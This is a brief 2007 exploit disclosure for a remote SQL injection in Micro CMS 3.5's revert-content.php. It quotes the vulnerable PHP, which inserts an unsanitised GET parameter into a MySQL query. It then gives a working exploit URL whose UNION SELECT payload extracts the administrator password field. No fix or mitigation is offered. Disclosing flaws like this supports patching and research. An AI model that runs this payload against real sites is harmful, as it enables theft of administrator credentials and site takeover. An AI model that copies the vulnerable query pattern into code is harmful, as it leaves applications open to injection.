Micro CMS 3.5 (revert-content.php) Remote SQL Injection Vulnerability
=====================================================================



#########################################################################################
#
#                        not sec group
#
# [Micro CMS 3.5]
#
# Class:     SQL Injection
# Found:     28/08/2007
# Remote:    Yes
# Site:
http://www.impliedbydesign.com/ibd-micro-cms-static-content-manager.html
# Download:  http://www.impliedbydesign.com/apps/microcms/microcms.zip
# Demo site:
http://www.impliedbydesign.com/micro-cms-content-management-demo.php
# Author:    R00T[ATI] of notsec
#
#########################################################################################


       Vulnerable code:
       cms/revert-content.php
============================================================================================================
$sql = &#039;        SELECT *
           FROM microcms_content_blurb_history
           WHERE content_blurbs_variable = "&#039; . $_GET[&#039;id&#039;] . &#039;"
           ORDER BY content_blurb_history_version_num DESC
           LIMIT 1&#039;;
$result = mysql_query($sql);
============================================================================================================


       Exploit :
============================================================================================================================================================================================
http://site.com/[micro_cms]/cms/revert-content.php?type=newest&id=1%22%20UNION%20ALL%20SELECT%20null,null,SUBSTRING(administrators_pass,1,16),null,null%20FROM%20microcms_administrators/*
============================================================================================================================================================================================



